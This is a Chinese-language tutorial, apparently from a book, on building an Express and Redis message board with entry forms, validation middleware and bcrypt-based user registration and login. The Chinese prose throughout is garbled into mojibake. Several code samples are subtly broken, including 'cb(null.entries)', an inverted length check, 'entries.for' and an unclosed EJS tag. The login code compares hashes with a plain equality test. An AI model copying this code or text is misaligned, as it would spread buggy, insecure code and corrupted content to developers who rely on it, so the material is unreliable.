ä¸Šæ¶ˆæ¯æäº¤åŠŸèƒ½ï¼Œå®žçŽ°è¿™ä¸ªåŠŸèƒ½éœ€è¦ä¸‹é¢å‡ é¡¹å·¥ä½œï¼š åˆ›å»ºæ¶ˆæ¯æ¨¡åž‹ æ·»åŠ ä¸Žæ¨¡åž‹æ¶ˆæ¯ç›¸å…³çš„è·¯ç”± åˆ›å»ºæ¶ˆæ¯è¡¨å• æ·»åŠ ä¸šåŠ¡é€»è¾‘ï¼Œç”¨æäº¤ä¸Šæ¥çš„è¡¨å•æ•°æ®åˆ›å»ºæ¶ˆæ¯ åˆ›å»ºæ¶ˆæ¯æ¨¡åž‹åˆ›å»ºæ¨¡åž‹ä¹‹å‰ï¼Œè¦å…ˆå®‰è£… Node redis æ¨¡å—ï¼š 1npm i -S redis å€ŸåŠ© Redis å’Œ ES6 å¯ä»¥è½»æ¾åˆ›å»ºå‡ºæ¥è½»ä¾¿çš„æ¨¡åž‹ã€‚ ä¸‹é¢çš„è¿™ä¸ªES6 ç±»ä¼šæŠŠæ•°æ®å­˜åœ¨ Redis åˆ—è¡¨ä¸­ã€‚ 12345678910111213141516171819202122232425262728// models/entry.jsconst redis = require('redis');// åˆ›å»º Redis å®¢æˆ·ç«¯å®žä¾‹const db = redis.createClient();class Entry &#123; constructor(obj) &#123; // å¾ªçŽ¯éåŽ†ä¼ å…¥å¯¹è±¡çš„å€¼ for (let key in obj) &#123; // åˆå¹¶å€¼ this[key] = obj[key]; &#125; &#125; save(cb) &#123; // å°†ä¿æŒçš„æ¶ˆæ¯è½¬æ¢æˆ JSON å­—ç¬¦ä¸² const entryJSON = JSON.stringify(this); // å°† JSON å­—ç¬¦ä¸²ä¿å­˜åˆ° Redis åˆ—è¡¨ä¸­ db.lpush( 'entries', entryJSON, (err) =&gt; &#123; if (err) return cb(err); cb(); &#125; ); &#125;&#125;module.exports = Entry; åŸºæœ¬æ¨¡åž‹æœ‰äº†ï¼ŒçŽ°åœ¨è¦æ·»åŠ èŽ·å–æ¶ˆæ¯ç”¨çš„ getRange å‡½æ•°ï¼Œä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼Œä½ å¯ä»¥ç”¨è¿™ä¸ªå‡½æ•°èŽ·å–æ¶ˆæ¯ã€‚ 123456789101112static getRange(from, to, cb) &#123; // ç”¨æ¥èŽ·å–æ¶ˆæ¯è®°å½•çš„ Redis lrange å‡½æ•° db.lrange('entries', from, to, (err, items) =&gt; &#123; if (err) return cb(err); let entries = []; // è§£ç ä¹‹å‰ä¿å­˜ä¸º JSON çš„æ¶ˆæ¯è®°å½• items.forEach(item =&gt; &#123; entries.push(JSON.parse(item)); &#125;); cb(null.entries); &#125;);&#125; åˆ›å»ºå¥½æ¨¡åž‹ï¼ŒçŽ°åœ¨å°±å¯ä»¥æ·»åŠ è·¯ç”±æ¥åˆ›å»ºæ¶ˆæ¯å’ŒèŽ·å–æ¶ˆæ¯äº†ã€‚ åˆ›å»ºæ¶ˆæ¯è¡¨å•123// app.jsapp.get('/post', entries.form); app.post('/post', entries.submit); æŽ¥ç€æŠŠä¸‹é¢çš„ä»£ç æ·»åŠ åˆ° routes/entries.js ä¸­ã€‚è¿™ä¸ªè·¯ç”±é€»è¾‘ä¼šæ¸²æŸ“ä¸€ä¸ªåŒ…å«è¡¨å•çš„æ¨¡æ¿ï¼š 123exports.form = (req, res) =&gt; &#123; res.render('post', &#123; title: 'Post' &#125;);&#125; ç„¶åŽç”¨ä¸‹é¢çš„ EJS ä»£ç åˆ›å»ºè¡¨å•æ¨¡æ¿ views/post.ejs 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt; &lt;%= title %&gt; &lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;/stylesheet/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;%= include menu %&gt; &lt;h1&gt; &lt;%= title%&gt; &lt;/h1&gt; &lt;p&gt;Fill in the form below to add a new post&lt;/p&gt; &lt;form action=&quot;/post&quot; method=&quot;post&quot;&gt; &lt;p&gt; &lt;input type=&quot;text&quot; name=&quot;entry[title]&quot; placeholder=&quot;Title&quot;&gt; &lt;/p&gt; &lt;p&gt; &lt;textarea name=&quot;entry[body]&quot; placeholder=&quot;Body&quot; cols=&quot;30&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt; &lt;/p&gt; &lt;p&gt; &lt;input type=&quot;submit&quot; value=&quot;Post&quot;&gt; &lt;/p&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; è¿™ä¸ªè¡¨å•ç”¨äº†å½¢å¦‚ entry[title]ä¹‹ç±»çš„è¾“å…¥æŽ§ä»¶åç§°ï¼Œéœ€è¦ç”¨æ‰©å±•çš„æ¶ˆæ¯ä½“è§£æžå™¨æ¥è§£æžã€‚ 1app.use(express.urlencoded(&#123; extended: true &#125;)); æ˜¾ç¤ºè¡¨å•çš„é¡µé¢åšå¥½äº†ï¼ŒæŽ¥ä¸‹æ¥æˆ‘ä»¬è¦ç”¨è¡¨å•æäº¤ä¸Šæ¥çš„æ•°æ®åˆ›å»ºæ¶ˆæ¯ã€‚ å®žçŽ°æ¶ˆæ¯çš„åˆ›å»ºæŠŠä¸‹é¢çš„ä»£ç æ·»åŠ åˆ°æ–‡ä»¶ routes/entries.js ä¸­ï¼Œå®žçŽ°ç”¨è¡¨å•æäº¤ä¸Šæ¥çš„æ•°æ®åˆ›å»ºæ¶ˆæ¯ã€‚ 123456789101112131415const Entry = require('../models/entry');exports.submit = (req, res, next) =&gt; &#123; const data = req.body.entry; const user = res.locals.user; const username = user ? user.name : null; const entry = new Entry(&#123; username: username, title: data.title, body: data.body &#125;); entry.save(err =&gt; &#123; if (err) return next(err); res.redirect('/'); &#125;);&#125; æ·»åŠ æ˜¾ç¤ºæ¶ˆæ¯é¦–é¡µå…ˆåˆ›å»º routes/entriesï¼Œç„¶åŽæŠŠä¸‹é¢çš„ä»£ç æ”¾åˆ°é‡Œé¢ï¼Œå¼•å…¥æ¶ˆæ¯æ¨¡åž‹ï¼Œè¾“å‡ºæ¸²æŸ“æ¶ˆæ¯åˆ—è¡¨çš„å‡½æ•°ã€‚ 12345678910exports.list = (req, res, next) =&gt; &#123; Entry.getRange(0, -1, (err, entries) =&gt; &#123; if (err) return next(err); // æ¸²æŸ“ HTTP å“åº” res.render('entries', &#123; title: 'Entries', entries: entries &#125;); &#125;);&#125; è¿™ä¸ªè·¯ç”±çš„ä¸šåŠ¡é€»è¾‘å®šä¹‰å¥½ä¹‹åŽï¼Œè¿˜éœ€è¦æ·»åŠ  EJS æ¨¡æ¿æ¥æ˜¾ç¤ºè¿™äº›æ¶ˆæ¯ã€‚åœ¨ views ç›®å½•ä¸‹åˆ›å»º entries.ejs æ–‡ä»¶ï¼Œå¹¶åŠ å…¥ä¸‹é¢çš„ EJS ä»£ç ã€‚ 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Page Title&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; href=&quot;/stylesheets/style.css&quot; /&gt;&lt;/head&gt;&lt;body&gt; &lt;% include menu %&gt; &lt;%entries.for((entry) =&gt;&#123; %&gt; &lt;div class=&quot;entry&quot;&gt; &lt;h3&gt;&lt;%= entry.title%&gt;&lt;/h3&gt; &lt;p&gt;&lt;%= entry.body&gt;&lt;/p&gt; &lt;p&gt;Post by &lt;%= entry.username%&gt;&lt;/p&gt; &lt;/div&gt; &lt;%&#125;)%&gt;&lt;/body&gt;&lt;/html&gt; åœ¨è¿è¡Œç¨‹åºä¹‹å‰ï¼Œå…ˆåˆ›å»ºèœå•æ¨¡æ¿æ–‡ä»¶menu.ejs ï¼ŒåŽé¢å†æ·»åŠ å…·ä½“ä»£ç ã€‚è§†å›¾å’Œè·¯ç”±å‡†å¤‡å¥½åŽï¼Œéœ€è¦å‘Šè¯‰ç¨‹åºåˆ°å“ªé‡ŒåŽ»æ‰¾è¿™äº›è·¯ç”±ã€‚ æ·»åŠ ä¸Žæ¶ˆæ¯ç›¸å…³çš„è·¯ç”±åœ¨æŠŠä¸Žæ¶ˆæ¯ç›¸å…³çš„è·¯ç”±æ·»åŠ åˆ°ç¨‹åºä¸­ä¹‹å‰ï¼Œéœ€è¦è°ƒæ•´ä¸€ä¸‹ app.jsã€‚å…ˆæŠŠä¸‹é¢è¿™ä¸ª requireè¯­å¥æ”¾åœ¨ app.js æ–‡ä»¶çš„é¡¶ç«¯ï¼š 1app.get('/', entries.list); çŽ°åœ¨è¿è¡Œè¿™ä¸ªç¨‹åºï¼Œé¦–é¡µä¼šæ˜¾ç¤ºæ¶ˆæ¯åˆ—è¡¨ã€‚ æ—¢ç„¶æ¶ˆæ¯åˆ›å»ºå’Œæ˜¾ç¤ºåˆ—è¡¨éƒ½åšå¥½äº†ï¼Œé‚£ä¹ˆæŽ¥ä¸‹æ¥è¯¥çœ‹çœ‹å¦‚ä½•ç”¨ç‰¹å®šè·¯ç”±ä¸­é—´ä»¶æ ¡éªŒè¡¨å•æ•°æ®äº†. ä½¿ç”¨ç‰¹å®šè·¯ç”±ä¸­é—´ä»¶å‡å®šä½ æƒ³å°†è¡¨å•ä¸­çš„æ¶ˆæ¯æ–‡æœ¬åŸŸè®¾ä¸ºå¿…å¡«é¡¹ã€‚èƒ½æƒ³åˆ°çš„ç¬¬ä¸€ç§æ–¹å¼å¯èƒ½æ˜¯åƒä¸‹é¢çš„ä»£ç é‚£æ ·æŠŠå®ƒç›´æŽ¥åŠ åœ¨è·¯ç”±å›žè°ƒå‡½æ•°ä¸­ã€‚ç„¶è€Œè¿™ç§æ–¹å¼å¹¶ä¸ç†æƒ³ï¼Œå› ä¸ºæ ¡éªŒé€»è¾‘æ˜¯ç»‘æ­»åœ¨è¿™ä¸ªè¡¨å•ä¸Šçš„ã€‚è€Œåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ ¡éªŒé€»è¾‘éƒ½èƒ½è¢«æç‚¼åˆ°å¯é‡ç”¨çš„ç»„ä»¶ä¸­ï¼Œè®©å¼€å‘æ›´å®¹æ˜“ã€æ›´å¿«ã€æ›´å…·å£°æ˜Žæ€§ï¼š 12345678910111213141516171819202122232425exports.submit = (req, res, next) =&gt; &#123; const data = req.body.entry; // æ ¡éªŒ if (!data.title) &#123; res.error('Title is required.'); res.redirect('back'); return; &#125; if (!data.title.length &lt; 4) &#123; res.error('Title must be longer than 4 characters.'); res.redirect('back'); return; &#125; const user = res.locals.user; const username = user ? user.name : null; const entry = new Entry(&#123; username: username, title: data.title, body: data.body &#125;); entry.save((err) =&gt; &#123; if (err) return next(err); res.redirect('/'); &#125;);&#125; Express è·¯ç”±å¯ä»¥æœ‰è‡ªå·±çš„ä¸­é—´ä»¶ï¼Œå…¶æ”¾åœ¨è·¯ç”±å›žè°ƒå‡½æ•°ä¹‹å‰ï¼Œåªæœ‰è·Ÿè¿™ä¸ªè·¯ç”±åŒ¹é…æ—¶æ‰ä¼šè°ƒç”¨ã€‚æœ¬ç« æ‰€ç”¨çš„è·¯ç”±å›žè°ƒå¹¶æ²¡æœ‰åšç‰¹æ®Šå¤„ç†ï¼Œè¿™äº›ä¸­é—´ä»¶å’Œå…¶ä»–ä¸­é—´ä»¶ä¸€æ ·ï¼Œç”šè‡³ä½ å³å°†åˆ›å»ºçš„ä¸­é—´ä»¶ä¹Ÿä¸€æ ·ã€‚ æŽ¥ä¸‹æ¥æˆ‘ä»¬è¦ç”¨ç‰¹å®šè·¯ç”±ä¸­é—´ä»¶æ¥åšæ ¡éªŒï¼Œå…ˆçœ‹ä¸€ç§è™½ç„¶ç®€å•ä½†ä¸å¤ªçµæ´»çš„å®žçŽ°æ–¹å¼ã€‚ ç”¨ç‰¹å®šè·¯ç”±ä¸­é—´ä»¶å®žçŽ°è¡¨å•æ ¡éªŒ ç¬¬ä¸€ç§æ–¹å¼æ˜¯å†™å‡ ä¸ªç®€å•ä½†ç‰¹å®šçš„ä¸­é—´ä»¶æ¥æ‰§è¡Œæ ¡éªŒï¼Œå¸¦æœ‰æ­¤ç±»ä¸­é—´ä»¶çš„ POST/post è·¯ç”±çœ‹èµ·æ¥åƒä¸‹é¢è¿™æ ·ï¼š 1234app.post('/post', requireEntryTitle, requireEntryTitleLengthAbove(4), entries.submit); ä¸€èˆ¬çš„è·¯ç”±å®šä¹‰åªæœ‰ä¸¤ä¸ªå‚æ•°ï¼šè·¯å¾„å’Œè·¯ç”±å¤„ç†å‡½æ•°ï¼Œè€Œè¿™ä¸ªè·¯ç”±å®šä¹‰ä¸­åˆé¢å¤–åœ°å¢žåŠ äº†ä¸¤ä¸ªå‚æ•°ï¼Œè¿™ä¸¤ä¸ªå‚æ•°å°±æ˜¯æ ¡éªŒä¸­é—´ä»¶ã€‚ ä¸‹é¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬æŠŠåŽŸæ¥çš„æ ¡éªŒé€»è¾‘å‰¥ç¦»å‡ºæ¥åšæˆäº†ä¸¤ä¸ªä¸­é—´ä»¶ï¼Œä½†å®ƒä»¬çš„æ¨¡å—åŒ–ç¨‹åº¦è¿˜ä¸é«˜ï¼Œåªèƒ½ç”¨åœ¨è¾“å…¥åŸŸ entry[title]ä¸Šã€‚ æ›´æœ‰æ½œåŠ›ä½†æ˜¯ä¸å®Œç¾Žçš„æ ¡éªŒç»„ä»¶ï¼š 1234567891011121314151617181920function requireEntryTitle(req,res,next)&#123; const title = req.body.entry.title; if(title)&#123; next(); &#125;else&#123; res.error('Title is required'); res.redirect('back'); &#125;&#125;;function requireEntryTitleLengthAbove(len)&#123; return (req,res,next) =&gt;&#123; const title = req.body.entry.title; if(title.length &gt; len)&#123; next(); &#125;else&#123; res.error(`Title must be longer than $&#123;len&#125;`); res.redirect('back'); &#125; &#125;&#125; å®žé™…å·¥ä½œä¸­æ›´å¸¸ç”¨çš„æ–¹æ¡ˆæ˜¯è¿›ä¸€æ­¥æŠ½è±¡ï¼Œå‰¥ç¦»æˆæ›´çµæ´»çš„æ ¡éªŒå™¨ï¼Œä»¥ç›®æ ‡è¾“å…¥åŸŸçš„åç§°ä¸ºå‚æ•°è¿›è¡Œæ ¡éªŒã€‚ä¸‹é¢æ¥çœ‹ä¸€ä¸‹è¿™ç§å®žçŽ°æ–¹å¼ã€‚ æž„å»ºçµæ´»çš„æ ¡éªŒä¸­é—´ä»¶ å¦‚æžœèƒ½é‡ç”¨æ ¡éªŒé€»è¾‘ï¼Œå¯ä»¥åƒä¸‹é¢è¿™æ ·ä¼ å…¥è¾“å…¥åŸŸåç§°ï¼Œé‚£æˆ‘ä»¬çš„å·¥ä½œé‡ä¼šè¿›ä¸€æ­¥é™ä½Ž 1234app.post('/post', validate.required('entry[title]'), validate.lengthAbove('entry[title]',4), entries.submit); æ‰“å¼€ app.jsï¼ŒæŠŠè·¯ç”±éƒ¨åˆ†çš„ app.post(â€˜/postâ€™, entries.submit);æ¢æˆä¸Šé¢è¿™æ®µä»£ç ã€‚è¿™é‡Œæœ‰å¿…è¦æä¸€ä¸‹ï¼ŒExpress ç¤¾åŒºå·²ç»åˆ›å»ºäº†å¾ˆå¤šç±»ä¼¼çš„å…¬ç”¨åº“ï¼Œä½†æŽŒæ¡æ ¡éªŒä¸­é—´ä»¶çš„å·¥ä½œæœºåˆ¶ä»¥åŠå¦‚ä½•ç¼–å†™ä¸­é—´ä»¶ä»ç„¶å¾ˆæœ‰å¿…è¦. åˆ›å»º ./middleware/validate.js æ–‡ä»¶ã€‚validate.jsä¼šè¾“å‡º validate.required()å’Œ validate.lengthAbove()ä¸¤ä¸ªä¸­é—´ä»¶ã€‚è¿™é‡Œçš„å®žçŽ°ç»†èŠ‚å¹¶ä¸é‡è¦ï¼Œå…³é”®æ˜¯é€šè¿‡è¿™ä¸ªä¾‹å­å­¦ä¹ å¦‚ä½•æç‚¼å‡ºç¨‹åºä¸­çš„é€šç”¨ä»£ç ï¼Œç”¨å°‘é‡çš„å·¥ä½œæˆæžœå‘æŒ¥ä½œç”¨ ä¸ºäº†è®©ç¨‹åºèƒ½è®¿é—®åˆ°è¿™ä¸ªä¸­é—´ä»¶ï¼Œéœ€è¦æŠŠä¸‹é¢è¿™è¡Œä»£ç æ”¾åˆ° app.js ä¸­ï¼š 1const validate = require('./middleware/validate'); ç”¨æˆ·è®¤è¯ æœ¬èŠ‚ä¼šä»Žå¤´ç»™ç¨‹åºåˆ›å»ºä¸€ä¸ªè®¤è¯ç³»ç»Ÿï¼Œå®žçŽ°ä»¥ä¸‹åŠŸèƒ½ï¼š å­˜å‚¨å’Œè®¤è¯å·²æ³¨å†Œç”¨æˆ· æ³¨å†ŒåŠŸèƒ½ ç™»å½•åŠŸèƒ½ åŠ è½½ç”¨æˆ·ä¿¡æ¯çš„ä¸­é—´ä»¶ æˆ‘ä»¬è¿˜æ˜¯ç”¨ Redis ä½œä¸ºç”¨æˆ·è´¦å·çš„å­˜å‚¨ï¼ŒæŽ¥ä¸‹æ¥åˆ›å»º User æ¨¡åž‹ï¼Œçœ‹çœ‹å¦‚ä½•è®© Redis ç”¨èµ·æ¥æ›´åŠ å®¹æ˜“ 1.ä¿å­˜å’ŒåŠ è½½ç”¨æˆ·è®°å½•å®žçŽ°ç”¨æˆ·åŠ è½½ã€ä¿å­˜å’Œè®¤è¯ï¼Œä»»åŠ¡æ¸…å•æ˜¯ï¼š ç”¨ package.json å®šä¹‰ç¨‹åºçš„ä¾èµ–é¡¹ åˆ›å»ºç”¨æˆ·æ¨¡åž‹ ç”¨ Redis åŠ è½½å’Œä¿å­˜ç”¨æˆ·ä¿¡æ¯ ç”¨ bcrypt å¢žå¼ºç”¨æˆ·å¯†ç çš„å®‰å…¨æ€§ å®žçŽ°ç”¨æˆ·è®¤è¯ Bcrypt æ˜¯ä¸€ä¸ªåŠ ç›çš„å“ˆå¸Œå‡½æ•°ï¼Œå¯ä½œä¸ºç¬¬ä¸‰æ–¹æ¨¡å—ä¸“é—¨å¯¹å¯†ç åšå“ˆå¸Œå¤„ç†ã€‚Bcrypt ç‰¹åˆ«é€‚åˆå¤„ç†å¯†ç ï¼Œå› ä¸ºè®¡ç®—æœºè¶Šæ¥è¶Šå¿«ï¼Œè€Œ bcrypt èƒ½è®©ç ´è§£å˜æ…¢ï¼Œä»Žè€Œæœ‰æ•ˆå¯¹æŠ—æš´åŠ›æ”»å‡»ã€‚ å…ˆå®‰è£…ï¼š 1npm i -S redis bcrypt 2.åˆ›å»ºç”¨æˆ·æ¨¡åž‹åœ¨ models æ–‡ä»¶å¤¹ä¸‹é¢åˆ›å»º user.js ä¸‹é¢çš„ä»£ç å¼•å…¥äº†ä¾èµ–é¡¹ redis å’Œ bcryptï¼Œç„¶åŽç”¨ redis.createClient() æ‰“å¼€ Redis è¿žæŽ¥ã€‚å‡½æ•° User å¯ä»¥åˆå¹¶ä¼ å…¥çš„å‚æ•°å¯¹è±¡ã€‚æ¯”å¦‚è¯´ï¼Œnew User({name:â€™Tobiâ€™})ä¼šåˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å°†å¯¹è±¡çš„å±žæ€§ name è®¾ä¸º Tobi. 12345678910111213141516const redis = require('redis');const bcrypt = require('bcrypt');// åˆ›å»ºåˆ° Redis çš„é•¿è¿žæŽ¥const db = redis.createClient();class User &#123; constructor(obj) &#123; // å¾ªçŽ¯éåŽ†ä¼ å…¥çš„å¯¹è±¡ for (let key in obj) &#123; // è®¾å®šå½“å‰ç±»çš„æ‰€æœ‰å±žæ€§ this[key] = obj[key]; &#125; &#125;&#125;module.exports = User; çŽ°åœ¨è¿™ä¸ªç”¨æˆ·æ¨¡åž‹åªæ˜¯ä¸ªæž¶å­ï¼Œè¿˜éœ€è¦åˆ›å»ºå’Œæ›´æ–°è®°å½•çš„æ–¹æ³•ã€‚ 3.æŠŠç”¨æˆ·ä¿å­˜åˆ° Redis ä¸­æŽ¥ä¸‹æ¥è¦å®žçŽ°çš„åŠŸèƒ½æ˜¯ä¿å­˜ç”¨æˆ·ï¼ŒæŠŠæ•°æ®å­˜åˆ° Redis ä¸­ï¼Œsave æ–¹æ³•ä¼šå…ˆæ£€æŸ¥ç”¨æˆ·æ˜¯å¦æœ‰IDï¼Œå¦‚æžœæ²¡æœ‰å°±è°ƒç”¨ update æ–¹æ³•ï¼Œç”¨åç§°ç´¢å¼•ç”¨æˆ· ID ï¼Œå¹¶æŠŠå¯¹è±¡çš„å±žæ€§ç»„è£…å‡º Redis å“ˆå¸Œè¡¨ä¸­çš„è®°å½•ï¼Œå¦‚æžœæ²¡æœ‰ ID ï¼Œåˆ™è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œå¢žåŠ  user.ids çš„å€¼ï¼Œç»™ç”¨æˆ·ä¸€ä¸ªå”¯ä¸€çš„ ID ï¼Œç„¶åŽå¯¹å¯†ç è¿›è¡Œå“ˆå¸Œå¤„ç†ï¼Œç”¨ä¹‹å‰æåˆ°çš„é‚£ä¸ª update æ–¹æ³•å°†æ•°æ®å­˜åˆ° Redis ä¸­ã€‚ 1234567891011121314151617181920212223242526272829save(cb) &#123; if (this.id) &#123; // å¦‚æžœè®¾ç½®äº† IDï¼Œåˆ™ç”¨æˆ·å·²ç»å­˜åœ¨äº† this.update(cb); &#125; else &#123; // åˆ›å»ºå”¯ä¸€çš„ ID db.incr('user:ids', (err, id) =&gt; &#123; if (err) return cb(err); this.id = id; // å“ˆå¸Œå¯†ç  this.hashPassword((err) =&gt; &#123; if (err) return cb(err); // ä¿å­˜ç”¨æˆ·å±žæ€§ this.update(cb); &#125;) &#125;); &#125;&#125;update(cb) &#123; const id = this.id; // ç”¨åç§°ç´¢å¼•ç”¨æˆ· id db.set(`user:id:$&#123;this.name&#125;`, id, (err) =&gt; &#123; if (err) return cb(err); // ç”¨ Redis å­˜å‚¨å½“å‰å±žæ€§ db.hmset(`user:$&#123;id&#125;`, this, (err) =&gt; &#123; cb(err); &#125;); &#125;);&#125; 4.å¢žå¼ºç”¨æˆ·å¯†ç çš„å®‰å…¨æ€§åˆšåˆ›å»ºç”¨æˆ·æ—¶ï¼Œéœ€è¦å°† .pass å±žæ€§è®¾ä¸ºç”¨æˆ·çš„å¯†ç ã€‚ç„¶åŽç”¨æˆ·ä¿å­˜é€»è¾‘å°† .pass å±žæ€§æ¢åšç»è¿‡å“ˆå¸Œå¤„ç†çš„å¯†ç ã€‚ è¿™ä¸ªå“ˆå¸Œä¼šåŠ ç›ï¼Œæ¯ä¸ªç”¨æˆ·çš„åŠ çš„ç›ä¸ä¸€æ ·ï¼ŒåŠ ç›å¯ä»¥æœ‰æ•ˆå¯¹æŠ—å½©è™¹è¡¨æ”»å‡»ã€‚å¯ä»¥ç”¨bcrypt çš„ genSalt()ä¸ºå“ˆå¸Œç”Ÿæˆ 12 ä¸ªå­—ç¬¦çš„ç› ç›ç”Ÿæˆå¥½ä¹‹åŽï¼Œè°ƒç”¨ bcrypt.hash()å¯¹.pass å±žæ€§å’Œç›åšå“ˆå¸Œå¤„ç†ã€‚åœ¨.update()æŠŠæ•°æ®å­˜åˆ° Redis ä¹‹å‰ï¼Œ.pass å±žæ€§çš„å€¼ä¼šæ¢æˆæœ€ç»ˆçš„å“ˆå¸Œå€¼ï¼Œä¿è¯ä¸ä¼šä¿å­˜å¯†ç çš„æ˜Žæ–‡ï¼Œåªä¿å­˜å®ƒçš„å“ˆå¸Œç»“æžœã€‚ä¸‹é¢ä»£ç ä¸­å®šä¹‰çš„å‡½æ•°ä¼šåˆ›å»ºåŠ ç›çš„å“ˆå¸Œï¼Œå¹¶æŠŠç»“æžœå­˜åˆ°ç”¨æˆ·çš„å±žæ€§.pass ä¸­ã€‚æŠŠå®ƒåŠ åˆ°models/user.js ä¸­ã€‚ 1234567891011121314hashPassword(cb) &#123; // ç”Ÿæˆæœ‰ 12 ä¸ªå­—ç¬¦ç› bcrypt.genSalt(12, (err, salt) =&gt; &#123; if (err) return cb(err); this.salt = salt; // ç”Ÿæˆå“ˆå¸Œ bcrypt.hash(this.pass, salt, (err, hash) =&gt; &#123; if (err) return cb(err); // è®¾å®šå“ˆå¸Œä»¥ä¾¿äºŽä¿å­˜ this.pass = hash; cb(); &#125;); &#125;);&#125; 5.æµ‹è¯•ç”¨æˆ·ä¿å­˜é€»è¾‘æŽ¥ç€è¿è¡Œ Redis-server å¯åŠ¨ Redis æœåŠ¡å™¨ï¼Œæ–°å»ºä¸€ä¸ª user-test.jsï¼ŒåŠ å…¥ä»£ç ï¼š 12345678const User = require('./models/user');const user = new User(&#123; name: 'Example', pass: 'test' &#125;);user.save((err) =&gt; &#123; // ä¿å­˜ç”¨æˆ· if (err) console.error(err); console.log('user id %d', user.id);&#125;); å¯ä»¥çœ‹åˆ°ç±»ä¼¼ä¸‹é¢çš„è¾“å‡ºï¼š æŽ¥ç€ä½¿ç”¨ Redis ä¸­çš„å·¥å…· redis-cli ï¼Œå¯ä»¥ç”¨ HGETALL å‘½ä»¤å–å‡ºå“ˆå¸Œè¡¨ä¸­çš„æ‰€æœ‰é”®å’Œå€¼ï¼Œå¦‚ä¸‹ï¼š 6.èŽ·å–ç”¨æˆ·æ•°æ®åœ¨ Web ç¨‹åºä¸­ï¼Œç”¨æˆ·ç™»å½•é€šå¸¸æ˜¯åœ¨è¡¨å•ä¸­è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œç„¶åŽå°†è¿™äº›æ•°æ®æäº¤åˆ°åŽå°è¿›è¡Œè®¤è¯ ã€‚åœ¨å¾—åˆ°ç™»å½•è¡¨å•æäº¤çš„æ•°æ®åŽï¼Œéœ€è¦ä¸€ä¸ªé€šè¿‡ç”¨æˆ·åèŽ·å–ä¿¡æ¯çš„æ–¹æ³•ã€‚ ä¸‹é¢çš„ä»£ç ä¸­çš„ User.getByName å°±æ˜¯è¿™æ ·çš„æ–¹æ³•ï¼Œè¿™ä¸ªå‡½æ•°å…ˆç”¨ User.getId() æŸ¥æ‰¾ç”¨æˆ· ID,ç„¶åŽæŠŠ ID ä¼ ç»™ User.get(),ç”±å®ƒè´Ÿè´£å–å¾— Redis å“ˆå¸Œè¡¨ä¸­çš„ç”¨æˆ·æ•°æ®ã€‚æŠŠä¸‹é¢çš„æ–¹æ³•åŠ åˆ° models/user.js ä¸­ 1234567891011121314151617181920static getByName(name, cb) &#123; // æ ¹æ®åç§°æŸ¥æ‰¾ç”¨æˆ· ID User.getId(name, (err, id) =&gt; &#123; if (err) return cb(err); // ç”¨ ID æŠ“å–ç”¨æˆ· User.get(id, cb); &#125;);&#125;static getId(name, cb) &#123; // å–å¾—ç”±åç§°ç´¢å¼•çš„ ID db.get(`user:id:$&#123;name&#125;`, cb);&#125;static get(id, cb) &#123; // èŽ·å–æ™®é€šå¯¹è±¡å“ˆå¸Œ db.hgetall(`user:$&#123;id&#125;`, (err, user) =&gt; &#123; if (err) return cb(err); // å°†æ™®é€šå¯¹è±¡è½¬æ¢ä¸ºæ–°çš„ User å¯¹è±¡ cb(null, new User(user)) &#125;);&#125; 7.ç”¨æˆ·ç™»å½•è®¤è¯123456789101112131415static authenticate(name,pass,cb)&#123; // é€šè¿‡ç”¨æˆ·åæŸ¥æ‰¾ç”¨æˆ· User.getByName(name,(err,user) =&gt;&#123; if(err) return cb(err); // ç”¨æˆ·ä¸å­˜åœ¨ if(!user.id) return cb(); bcrypt.hash(pass,user.salt,(err,hash) =&gt;&#123; if(err) return cb(err); // åŒ¹é…å‘çŽ°å‘ if(hash == user.pass) return cb(null,user); // å¯†ç æ— æ•ˆ cb(); &#125;); &#125;);&#125; è®¤è¯åŠŸèƒ½ä¸€å¼€å§‹å…ˆç”¨ç”¨æˆ·æŸ¥æ‰¾ç”¨æˆ·è®°å½•ï¼Œå¦‚æžœæ²¡æœ‰æ‰¾åˆ°ï¼Œé©¬ä¸Šè°ƒç”¨å›žè°ƒå‡½æ•°ï¼Œåä¹‹æŠŠä¿å­˜åœ¨ç”¨æˆ·å¯¹è±¡ä¸­çš„ç›å’Œæäº¤ä¸Šæ¥çš„å¯†ç åšå“ˆå¸Œå¤„ç†ï¼Œäº§ç”Ÿçš„ç»“æžœåº”è¯¥è·Ÿ user.pass å“ˆå¸Œå€¼ç›¸åŒã€‚å¦‚æžœä¸¤ä¸ªå“ˆå¸Œå€¼ä¸åŒ¹é…ï¼Œè¯´æ˜Žç”¨æˆ·è¾“å…¥çš„å‡­è¯æ˜¯æ— æ•ˆçš„ã€‚å½“æŸ¥æ‰¾ä¸å­˜åœ¨çš„é”®æ—¶ï¼ŒRedis ä¼šè¿”å›žä¸€ä¸ªç©ºçš„å“ˆå¸Œå€¼ï¼Œæ‰€ä»¥è¿™é‡Œçš„æ£€æŸ¥æ–¹æ³•æ˜¯ !user.id è€Œä¸æ˜¯ ï¼userã€‚ æ³¨å†Œæ–°ç”¨æˆ·ä¸ºäº†è®©ç”¨æˆ·åˆ›å»ºæ–°è´¦å·åŽç™»é™†ï¼Œéœ€è¦æä¾›æ³¨å†Œå’Œç™»å½•åŠŸèƒ½ã€‚ å®Œæˆä¸‹é¢çš„ä»»åŠ¡å®žçŽ°æ³¨å†Œï¼š å°†æ³¨å†Œå’Œç™»å½•è·¯ç”±æ˜ å°„åˆ°URLè·¯å¾„ä¸Š æ·»åŠ æ˜¾ç¤ºæ³¨å†Œè¡¨å•çš„æ³¨å†Œè·¯ç”±å¤„ç†å™¨ 